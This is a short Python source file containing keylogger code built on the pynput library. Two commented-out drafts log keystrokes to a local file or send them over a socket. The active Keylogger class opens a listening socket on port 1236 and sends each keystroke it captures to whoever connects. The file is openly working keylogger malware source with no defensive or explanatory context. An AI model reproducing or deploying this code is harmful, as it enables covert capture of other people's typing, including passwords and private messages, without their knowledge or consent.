from pynput import keyboard

# def keyPressed(key):
#     print("hello")
#     print(str(key))
#     with open("./keyfile.txt", 'a') as logKey:
#         try:
#             char = key.char
#             logKey.write(char)
#         except:
#             print("Error getting char")
    

# if __name__ == "__main__":
#     listener = keyboard.Listener(on_press=keyPressed)
#     listener.start()
#     input()



# import socket

# class Keylogger:
#     def __init__(self, conn):
#         self.key = ""
#         self.listener = None
#         self.conn = conn
    
#     def start(self):
#         self.listener = keyboard.Listener(on_press=self.log)
#         self.listener.start()
#         input()

#     def log(self, key):
#         self.conn.send(str(key.char).encode())

#     def stop(self):
#         self.listener.stop()
#         self.listener = None
#         self.conn.close()


import socket

class Keylogger:
    def __init__(self):
        self.key = None
        self.listener = None
        self.port = 1236
        self.host = "0.0.0.0"
        self.server_socket = None
        self.conn = None
        self.address = None
    
    def start(self):
        self.server_socket = socket.socket()
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        self.conn, self.address = self.server_socket.accept()

        print("Connection from: " + str(self.address))

        self.listener = keyboard.Listener(on_press=self.log)
        self.listener.start()
        input()

    def log(self, key):
        self.conn.send(str(key.char).encode())

    def stop(self):
        self.listener.stop()
        self.listener = None
        self.conn.close()